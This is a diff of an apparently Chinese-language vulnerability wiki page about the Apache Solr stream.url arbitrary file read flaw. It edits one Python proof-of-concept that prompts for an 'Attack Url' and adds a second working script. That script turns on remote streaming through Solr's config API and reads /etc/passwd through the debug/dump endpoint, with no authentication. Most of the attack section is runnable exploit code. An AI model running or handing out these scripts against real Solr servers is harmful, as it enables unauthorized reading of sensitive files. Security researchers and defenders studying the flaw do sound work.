@@ -1,8 +1,13 @@
-# Apache Solr 任意文件读取漏洞
+# Apache Solr stream.url 任意文件读取漏洞
 
 ## 漏洞描述
 
-Apache Solr 存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标服务器敏感文件
+Apache Solr 存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标服务器敏感文件。
+
+参考链接：
+
+- Apache Solr 组件安全概览 https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ 
+- https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ
 
 ## 漏洞影响
 
@@ -92,6 +97,8 @@ curl "http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams" -F "s
 
 ## 漏洞POC
 
+poc1：
+
 - POC还是建立在未授权访问的情况下
 
 ```python
@@ -105,16 +112,6 @@ from lxml import etree
 import json
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-def title():
-    print('+------------------------------------------')
-    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m')
-    print('+  \033[34mGithub : https://github.com/PeiQi0        \033[0m')
-    print('+  \033[34m公众号  : PeiQi文库                        \033[0m')
-    print('+  \033[34mVersion: Apache Solr < 8.2.0            \033[0m')
-    print('+  \033[36m使用格式: python3 poc.py     			    \033[0m')
-    print('+  \033[36mUrl    >>> http://xxx.xxx.xxx.xxx:8983  \033[0m')
-    print('+  \033[36mFile   >>> 文件名称或目录                  \033[0m')
-    print('+------------------------------------------')
 
 def POC_1(target_url):
     core_url = target_url + "/solr/admin/cores?indexInfo=false&wt=json"
@@ -165,7 +162,6 @@ def POC_3(target_url, core_name, File_name):
         print("\033[31m[x] 请求失败 \033[0m", e)
 
 if __name__ == '__main__':
-    title()
     target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
     core_name = POC_1(target_url)
     POC_2(target_url, core_name)
@@ -176,6 +172,28 @@ if __name__ == '__main__':
 
 ![image-20220209121044117](./images/202202091210263.png)
 
-## 参考文章
+poc2：
 
-https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ
+```python
+#!/usr/bin/python
+# coding: UTF-8
+import requests
+
+host="http://192.168.1.79:8081/"
+if host[-1]=='/':
+    host=host[:-1]
+def get_core(host):
+    url=host+'/solr/admin/cores?indexInfo=false&wt=json'
+    core_data=requests.get(url,timeout=3).json()
+    if core_data['status']:
+        core=core_data['status'].keys()[0]
+        jsonp_data={"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":'true'}}
+        requests.post(url=host+"/solr/%s/config"%core,json=jsonp_data)
+
+        result_data=requests.post(url=host+'/solr/%s/debug/dump?param=ContentStreams'%core,data={"stream.url":"file:///etc/passwd"}).json()
+        if result_data['streams']:
+            print result_data['streams'][0]['stream']
+    else:
+        exit("不存在此漏洞")
+get_core(host)
+```
